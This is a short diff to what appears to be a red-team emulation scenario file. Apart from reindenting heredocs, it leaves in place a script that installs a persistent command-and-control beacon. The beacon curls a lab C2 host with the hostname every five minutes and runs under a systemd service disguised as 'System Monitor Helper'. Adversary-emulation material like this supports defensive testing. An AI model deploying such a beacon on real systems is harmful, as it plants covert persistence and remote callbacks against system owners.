@@ -20,23 +20,23 @@ caldera:
     description: "Install a persistent beacon via systemd service"
     command: |
       cat > /tmp/beacon.sh << 'BEACON'
-      #!/bin/bash
-      while true; do
-        curl -sk http://c2.redteam.local/beacon?host=$(hostname) || true
-        sleep 300
-      done
-      BEACON
+#!/bin/bash
+while true; do
+  curl -sk "http://c2.redteam.local/beacon?host=$(hostname)" || true
+  sleep 300
+done
+BEACON
       chmod +x /tmp/beacon.sh
       cat > /etc/systemd/system/sysmon-helper.service << 'SVC'
-      [Unit]
-      Description=System Monitor Helper
-      After=network.target
-      [Service]
-      ExecStart=/tmp/beacon.sh
-      Restart=always
-      [Install]
-      WantedBy=multi-user.target
-      SVC
+[Unit]
+Description=System Monitor Helper
+After=network.target
+[Service]
+ExecStart=/tmp/beacon.sh
+Restart=always
+[Install]
+WantedBy=multi-user.target
+SVC
       systemctl daemon-reload && systemctl enable sysmon-helper && systemctl start sysmon-helper && echo "GOAL_ACHIEVED: c2 beacon installed"
 
 verification:
